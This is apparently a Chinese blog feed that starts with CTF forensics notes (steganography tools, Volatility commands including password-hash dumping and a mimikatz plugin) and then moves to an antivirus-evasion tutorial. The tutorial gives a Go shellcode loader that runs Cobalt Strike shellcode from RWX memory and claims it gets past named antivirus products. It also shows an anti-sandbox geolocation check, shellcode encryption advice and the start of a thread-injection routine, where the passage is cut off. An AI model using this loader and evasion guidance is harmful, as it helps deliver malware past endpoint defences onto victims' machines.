src="/2024/09/16/misc/image-20240910225048302.png" alt="image-20240910225048302"></p><h2 id="Decabit-脉冲"><a href="#Decabit-脉冲" class="headerlink" title="Decabit 脉冲"></a>Decabit 脉冲</h2><p>也可以替换为01尝试</p><p><img src="/2024/09/16/misc/image-20240912125157608.png" alt="image-20240912125157608"></p><h2 id="DNA"><a href="#DNA" class="headerlink" title="DNA"></a>DNA</h2><p><img src="/2024/09/16/misc/image-20240912125245027.png" alt="image-20240912125245027"></p><h2 id="arnold猫脸变换"><a href="#arnold猫脸变换" class="headerlink" title="arnold猫脸变换"></a>arnold猫脸变换</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs maxima">from PIL import Image<br><br>img = Image.open(&#x27;catcat.png&#x27;)<br><span class="hljs-keyword">if</span> img.mode == <span class="hljs-string">&quot;P&quot;</span>:<br>    img = img.<span class="hljs-built_in">convert</span>(<span class="hljs-string">&quot;RGB&quot;</span>)<br>assert img.size[<span class="hljs-number">0</span>] == img.size[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">dim</span> = <span class="hljs-built_in">width</span>, <span class="hljs-built_in">height</span> = img.size<br><br>st = <span class="hljs-number">1</span><br>a = <span class="hljs-number">114</span><br>b = <span class="hljs-number">514</span><br><span class="hljs-keyword">for</span> <span class="hljs-symbol">_</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(st):<br>    with Image.<span class="hljs-built_in">new</span>(img.mode, <span class="hljs-built_in">dim</span>) as canvas:<br>        <span class="hljs-keyword">for</span> nx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>            <span class="hljs-keyword">for</span> ny <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>                y = (ny - nx * a) <span class="hljs-symbol">%</span> <span class="hljs-built_in">width</span><br>                x = (nx - y * b) <span class="hljs-symbol">%</span> <span class="hljs-built_in">height</span><br>                canvas.putpixel((y, x), img.getpixel((ny, nx)))<br>canvas.<span class="hljs-built_in">show</span>()<br>canvas.<span class="hljs-built_in">save</span>(&#x27;flag.png&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/2024/09/16/misc/image-20240913105106499.png" alt="image-20240913105106499">隐</p><h2 id="螺旋加密"><a href="#螺旋加密" class="headerlink" title="螺旋加密"></a>螺旋加密</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vim">def <span class="hljs-keyword">function</span>(n):<br>    matrix = [[<span class="hljs-number">0</span>] * n <span class="hljs-keyword">for</span> _ in <span class="hljs-built_in">range</span>(n)]<br><br>    <span class="hljs-keyword">number</span> = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>, <span class="hljs-keyword">up</span>, down = <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">left</span> &lt; <span class="hljs-keyword">right</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">up</span> &lt; down:<br>        # 从左到右<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>):<br>            matrix[<span class="hljs-keyword">up</span>][i] = <span class="hljs-keyword">number</span><br>            <span class="hljs-keyword">number</span> += <span class="hljs-number">1</span><br><br>        # 从上到下<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-keyword">up</span>, down):<br>            matrix[i][<span class="hljs-keyword">right</span>] = <span class="hljs-keyword">number</span><br>            <span class="hljs-keyword">number</span> += <span class="hljs-number">1</span><br><br>        # 从右向左<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-keyword">right</span>, <span class="hljs-keyword">left</span>, -<span class="hljs-number">1</span>):<br>            matrix[down][i] = <span class="hljs-keyword">number</span><br>            <span class="hljs-keyword">number</span> += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(down, <span class="hljs-keyword">up</span>, -<span class="hljs-number">1</span>):<br>            matrix[i][<span class="hljs-keyword">left</span>] = <span class="hljs-keyword">number</span><br>            <span class="hljs-keyword">number</span> += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">left</span> += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">right</span> -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">up</span> += <span class="hljs-number">1</span><br>        down -= <span class="hljs-number">1</span><br>    # n 为奇数的时候，正方形中间会有个单独的空格需要单独填充<br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>: <br>        matrix[n // <span class="hljs-number">2</span>][n // <span class="hljs-number">2</span>] = <span class="hljs-keyword">number</span><br>    <span class="hljs-keyword">return</span> matrix<br></code></pre></td></tr></table></figure><p>SilentEyes：通用图片和音频加密</p><p>exiftools：exif数据查看</p><p>wbStego4open：PDF,TXT,HTM.BMP隐写<br>snow隐写：属于空格隐写的一种，还有me隐写，可以用于图片的16进制文本</p><p><a href="https://www.darkside.com.au/snow">https://www.darkside.com.au/snow</a></p><p>clienteye：行列不对齐的小灰块</p><p>DeEgger Embedder:PDF 图片隐写</p><p>stegpy：stegpy path -p pass</p><h1 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h1><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>raw&#x2F;mem&#x2F;dmp&#x2F;dump</p><p>可以使用strings获取系统版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 识别操作系统的基本信息</span><br>vol.py mem.dump imageinfo<br><span class="hljs-comment"># 查看进程</span><br>vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist<br><span class="hljs-comment"># 查看隐藏或者解链的进程</span><br>vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree<br><span class="hljs-comment"># 通过memdump爆破出进程对应的信息</span><br>vol.py -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 3036 --dump-dir=./<br><span class="hljs-comment"># 扫描镜像中的服务</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 svcscan<br><span class="hljs-comment"># 扫描进程缓存的文件</span><br>vol.py -f memory.raw --profile=Win7SP1x64 filescan<br><span class="hljs-comment"># 查找特定后缀的文件</span><br>vol.py -f example.raw --profile=Win7SP1x64 filescan | grep -E <span class="hljs-string">&#x27;txt|png|jpg|gif|zip|rar|7z|pdf|doc&#x27;</span><br><span class="hljs-comment"># 查找指定文件夹下的文件</span><br>volatility -f example.raw --profile=Win7SP1x64 filescan | grep TMP_User<br><span class="hljs-comment"># 使用dumpfiles爆破文件内容（有时可能会出现vol2提取不了但是vol3可以的情况，也可以使用 R-stdio 工具提取）</span><br>vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 --dump-dir=./<br><span class="hljs-comment"># 查看进程环境变量</span><br>vol.py -f memory.raw --profile=Win7SP1x64 envars<br><span class="hljs-comment"># 扫描进程命令行参数</span><br>vol.py -f memory.raw --profile=Win7SP1x64 cmdscan<br>vol.py -f memory.raw --profile=Win7SP1x64 cmdline<br><span class="hljs-comment"># 扫描动态库列表</span><br><span class="hljs-comment"># 可使用-p参数指定PID号</span><br>vol.py -f memory.img --profile=Win2003SP1x86 dlllist<br>vol.py -f memory.img --profile=Win2003SP1x86 ldrmodules<br><span class="hljs-comment"># 扫描系统中的恶意软件</span><br>vol.py -f memory.img --profile=Win2003SP1x86 malfind<br><span class="hljs-comment"># 查看当前镜像中的用户</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span><br><span class="hljs-comment"># 查看镜像中的用户名和密码(hash值)</span><br>vol.py -f OtterCTF.vmem --profile=Win7SP1x64 hashdump<br><span class="hljs-comment"># 使用mimikatz插件快速获取用户密码</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.dump --profile=Win7SP1x64 mimikatz<br><span class="hljs-comment"># 扫描注册表数据</span><br><span class="hljs-comment"># 查看注册表配置单元</span><br>vol.py -f memory.raw --profile=Win7SP1x64 hivelist<br><span class="hljs-comment"># 查看注册表键值</span><br>vol.py -f OtterCTF.vmem --profile=Win7SP1x64 printkey<br><span class="hljs-comment"># 查看注册表键名</span><br>vol.py -f memory.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a001cce010(注册表Volatility地址)<br><span class="hljs-comment"># 查看网络连接状态</span><br>vol.py -f memory.raw --profile=Win7SP1x64 connscan<br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 netscan<br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f mem.raw --profile=Win7SP1x64 connections<br><span class="hljs-comment"># 查看浏览器历史记录</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 iehistory<br><span class="hljs-comment"># 显示有关编辑控件的信息</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 editbox<br><span class="hljs-comment"># 查看当前展示的notepad的内容</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 notepad<br><span class="hljs-comment"># 获取屏幕截图</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 screenshot --dump-dir=./<br><span class="hljs-comment"># 查看剪贴板信息</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 clipboard<br><span class="hljs-comment"># 查看剪贴板信详细内容</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 clipboard -v<br><span class="hljs-comment"># 查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 userassist<br><span class="hljs-comment"># 最大程序提取信息</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 timeliner<br><span class="hljs-comment"># 恢复被删除的文件</span><br>vol.py -f 1.vmem --profile=Win7SP1x64 mftparser<br><span class="hljs-comment"># 使用ndispktscan插件搜索内核的网络流量包信息</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 ndispktscan<br><span class="hljs-comment"># 使用usbstor插件获取USB连接信息</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 usbstor<br><span class="hljs-comment"># 使用VolDiff进行恶意软件检测</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 voldiff<br><span class="hljs-comment"># 使用bitlocker插件获取Bitlocker的加密密钥</span><br>vol.py --plugins=/home/kali/volatility/volatility/plugins -f OtterCTF.vmem --profile=Win7SP1x64 bitlocker<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看命令</span><br>vol3.py -h<br><span class="hljs-comment"># 扫描镜像中的文件</span><br>vol3.py -f dacong.raw windows.filescan<br><span class="hljs-comment"># 查看桌面上的文件</span><br>vol3.py -f dacong.raw windows.filescan | grep Desktop<br><span class="hljs-comment"># 提取文件</span><br>vol3.py -f mem.raw windows.dumpfiles --virtaddr=<span class="hljs-string">&quot;0x0000e0007ad17f20&quot;</span><br><span class="hljs-comment"># 扫描注册表（感觉这个功能vol2的更好）</span><br>vol3.py -f dacong.raw windows.registry.printkey<br>vol3.py -f dacong.raw windows.registry.hivelist<br><span class="hljs-comment"># 扫描命令行记录</span><br>vol3.py -f dacong.raw windows.cmdline<br><span class="hljs-comment"># 查看网络使用状态、端口占用状态</span><br>vol3.py -f dacong.raw windows.netscan<br>vol3.py -f dacong.raw windows.netstat<br><span class="hljs-comment"># 查看系统中的进程</span><br>vol3.py -f dacong.raw windows.pslist<br>vol3.py -f dacong.raw windows.pstree<br></code></pre></td></tr></table></figure><p><img src="/2024/09/16/misc/image-20240912170316898.png" alt="image-20240912170316898"></p><ol><li><code>VBoxTray.exe：类似vmtool</code></li><li><code>ClipboardMonitor：剪切板监控软件</code></li><li><code>mstsc.exe：远程桌面连接</code></li></ol><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><p>fat&#x2F;VMDK&#x2F;e01&#x2F;ad1&#x2F;vhd</p><p>veracrypt挂载,取证大师<img src="/2024/09/16/misc/image-20240912170612405.png" alt="image-20240912170612405"></p><ul><li>用户的powershell历史记录会保存在这个路径下 \Users\test\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</li><li>D盾扫网站目录</li><li>mysql数据从qp.xb恢复</li><li>磁盘回复：extundelete</li><li>浏览器凭证破解：firepwd</li><li>DPAPI破解</li><li>加密卷：veracrypt truecrypt encfs</li><li>GPG&#x2F;PGP:GPG&#x2F;Kleopatra</li><li>cipher加密：Advanced efs data recovery</li></ul><h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>修复：QRazyBox，PS</p><p>反色处理</p><h1 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark提取<br><span class="hljs-comment"># -r [输入的pcap文件路径]: 指定要分析的pcap文件。</span><br><span class="hljs-comment"># -Y &quot;http.request.method == POST&quot;: 使用一个显示过滤器只显示POST请求。</span><br><span class="hljs-comment"># -T fields: 输出指定的字段数据。</span><br><span class="hljs-comment"># -e http.file_data: 输出HTTP负载的数据。</span><br><br>tshark -r 1.pcapng -Y <span class="hljs-string">&quot;http&quot;</span> -T fields -e http.file_data | <span class="hljs-built_in">uniq</span> &gt; data.txt<br>可以使用 <span class="hljs-built_in">uniq</span> 参数去除重复行<br><br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">过滤<br><span class="hljs-keyword">http</span>。request<br></code></pre></td></tr></table></figure><p>分类</p><ul><li>USB</li><li>Webshell</li><li>NTLM</li><li>工控</li><li>蓝牙（OBEX）</li><li>邮件（SMTP）</li><li>无线流量</li><li>ICMP</li><li>VPN</li><li>ADS-B</li><li>修复流量包</li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><p>eml-analyzer：提取邮件附件</p><p><img src="/2024/09/16/misc/image-20240910230252285.png" alt="image-20240910230252285"></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>var&#x2F;cache&#x2F;locate&#x2F;locatedb locate命令数据库</p><h2 id="tupper自指"><a href="#tupper自指" class="headerlink" title="tupper自指"></a>tupper自指</h2><p>数字转图片</p><h2 id="ps临近缩小"><a href="#ps临近缩小" class="headerlink" title="ps临近缩小"></a>ps临近缩小</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scap文件-sysdig处理</span><br><span class="hljs-keyword"></span>apng文件（文件头acTL和fcTL）-apngdis_gui<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>面筋</title>
    <link href="/2024/09/16/%E9%9D%A2%E7%AD%8B/"/>
    <url>/2024/09/16/%E9%9D%A2%E7%AD%8B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e6b1b2ab9a9405bcca4e8da42766b23cc7a926fc06af59fab69bda46b8dd746d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>工作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀</title>
    <link href="/2024/09/16/%E5%85%8D%E6%9D%80/"/>
    <url>/2024/09/16/%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113141843541.png" class="" title="image-20250113141843541"><h1 id="针对杀软确定方向"><a href="#针对杀软确定方向" class="headerlink" title="针对杀软确定方向"></a>针对杀软确定方向</h1><p>引用别人的的总结</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113103236123.png" class="" title="image-20250113103236123"><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113103350949.png" class="" title="image-20250113103350949"><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">启发式：分为动静态技术，静态指的就是一些字符串匹配之类的功能，动态是虚拟机查杀<br>主动防御：对于系统中的操作实时监控，例如卡巴强大的内存扫描功能<br></code></pre></td></tr></table></figure><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104216986.png" class="" title="image-20250113103250788"><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113103302014.png" class="" title="image-20250113103302014"><p>如上测试的过程中，根据卡巴爆毒PDM（主动防御），则确认木马是落地后敏感操作被杀，可以针对木马上线后操作特征做免杀（api调用，cs原有的特征，流量等）</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250117113536424.png" class="" title="image-20250117113536424"><p>HEUR则是无法通过虚拟机检测或者静态扫描（静态资源，关键字等）</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113103725857.png" class="" title="image-20250113103725857"><p>个人测试下来的感受是除了卡巴都不算难绕过，360的杀毒功能相对强一点，火绒只需要随意做一下免杀</p><h1 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h1><p>通过检测虚拟机环境来绕过虚拟机检测，但是很多<strong>检测环境的操作被标记为敏感</strong>（例如检测系统中的内存会被微步标记敏感）</p><p>常用操作有检测内存大小、cpu数目、有无常见软件（微信等）、用户名、临时文件数目、时间加速</p><p>如以下代码，但是其实大多杀软静态启发扫描较容易绕过，加上这些操作反而会可能导致敏感</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkIP</span><span class="hljs-params">()</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;<br>url := <span class="hljs-string">&quot;https://myip.ipip.net/&quot;</span><br><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>body, err := ioutil.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br>content := <span class="hljs-type">string</span>(body)<br><br><span class="hljs-keyword">if</span> strings.Contains(content, <span class="hljs-string">&quot;中国&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h1><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250117104201931.png" class="" title="image-20250117104201931"><p>静态会讨论到有关编码，加壳，修改文件资源（影响熵）等概念，这里由于我自己用的是<strong>分离加载</strong>，重点使用的是编码</p><p>对于壳，已经被360等杀软加入特征，不是比较新的加壳方法不太建议使用了</p><h3 id="签名窃取"><a href="#签名窃取" class="headerlink" title="签名窃取"></a>签名窃取</h3><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250114113333786.png" class="" title="image-20250114113333786"><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>常用加密方式：base64，aes，rc4等</p><p>静态shellcode加密项目</p><p><a href="https://github.com/egebalci/sgn">GitHub - EgeBalci&#x2F;sgn: Shikata ga nai (仕方がない) encoder ported into go with several improvements</a></p><p>对于分离出来的shellcode，使用aes或者sgn都能起到足够的免杀效果</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104247821.png" class="" title="image-20250115104247821"><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104251410.png" class="" title="image-20250115104251410"><p>garble是go编译的加密工具，但是被大量加入特征，感觉不好用了</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250117104312313.png" class="" title="image-20250117104312313"><h1 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h1><p>cs生成shellcode，我这里直接用raw</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113110823628.png" class="" title="image-20250113110823628"><p>分离加载实际上就是通过加载器去运行shellcode，那么shellcode可以单独的静态加密、也可以通过放在公网上分段下载这些方式去绕过对shellcode本身特征的检测</p><p>这里主要介绍一下一些加载shellcode的方式</p><p>这里有三个作用</p><ul><li>绕过导入表检测（直接通过ntdll找函数</li></ul><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104623594.png" class="" title="image-20250115104623594"><ul><li>尽可能在r3层中靠近内核</li></ul><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104601371.png" class="" title="image-20250115104601371"><ul><li>文件不落地（通过ntdll的分配内存，拷贝内存等操作</li></ul><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104609570.png" class="" title="image-20250115104609570">在学习分离加载的过程中会接触到很多的winapi函数<p>基础的demo</p><ol><li><p>申请内存区域</p></li><li><p>拷贝shellcode到内存中</p></li><li><p>直接执行shellcode</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250115104653584.png" class="" title="image-20250115104653584"></li></ol><h2 id="go实现"><a href="#go实现" class="headerlink" title="go实现"></a>go实现</h2><p>自定义一些windows api函数</p><p>使用了golang.org&#x2F;x&#x2F;sys&#x2F;windows 和 syscall unsafe os库</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113112618958.png" class="" title="image-20250113112618958"><p>获取dll 定义常量</p><img src="/2024/09/16/%E5%85%8D%E6%9D%80/image-20250113112711710.png" class="" title="image-20250113112711710"><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>以下代码都删除了不重要的部分</p><p>可以过360核晶，火绒等</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">original_loader</span><span class="hljs-params">(shellcode []<span class="hljs-type">byte</span>)</span></span> &#123;<br><span class="hljs-comment">//调用VirtualAlloc为shellcode申请一块内存</span><br>addr, _, err := VirtualAlloc.Call(<span class="hljs-number">0</span>, <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)<br><br><span class="hljs-comment">//调用RtlCopyMemory来将shellcode加载进内存当中</span><br>_, _, err = RtlCopyMemory.Call(addr, (<span class="hljs-type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="hljs-number">0</span>])), <span class="hljs-type">uintptr</span>(<span class="hljs-built_in">len</span>(shellcode)))<br><br><span class="hljs-comment">//syscall来运行shellcode</span><br>_, _, _ = syscall.SyscallN(addr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="线程注入"><a href="#线程注入" class="headerlink" title="线程注入"></a>线程注入</h3><p>获取进程–分配内存–写入shellcode–线程执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DirectShellcodeInject</span><span class="hljs-params">(fp <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>encodeDataByte, err := os.ReadFile(fp)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;读取文件时出错: %v\n&quot;</span>, err)<br>&#125;<br>shellcode := 